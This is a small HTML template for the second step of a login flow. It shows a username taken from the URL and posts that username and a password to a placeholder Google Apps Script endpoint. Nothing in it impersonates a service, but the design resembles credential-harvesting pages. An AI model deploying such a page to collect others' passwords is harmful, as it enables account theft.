<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Login - Step 2</title>
  <style>
    body { font-family: Arial, sans-serif; padding: 20px; }
    input { padding: 10px; width: 100%; margin: 10px 0; box-sizing: border-box; }
    button { padding: 10px 20px; font-size: 16px; }
    #displayUser { font-weight: bold; margin-bottom: 10px; }
  </style>
</head>
<body>

  <h2>Enter Your Password</h2>
  <p id="displayUser"></p>

  <form method="POST" action="https://script.google.com/macros/s/YOUR_STEP2_SCRIPT_ID/exec">
    <!-- Hidden input to carry the username to the backend -->
    <input type="hidden" name="user" id="userField" value="">

    <input type="password" name="pass" placeholder="Password" required>
    <button type="submit">Login</button>
  </form>

  <script>
    // Grab username from query string
    const params = new URLSearchParams(window.location.search);
    const user = params.get('user') || '';

    // Show username on page
    document.getElementById('displayUser').innerText = user;

    // Include username in hidden field for POST
    document.getElementById('userField').value = user;
  </script>

</body>
</html>
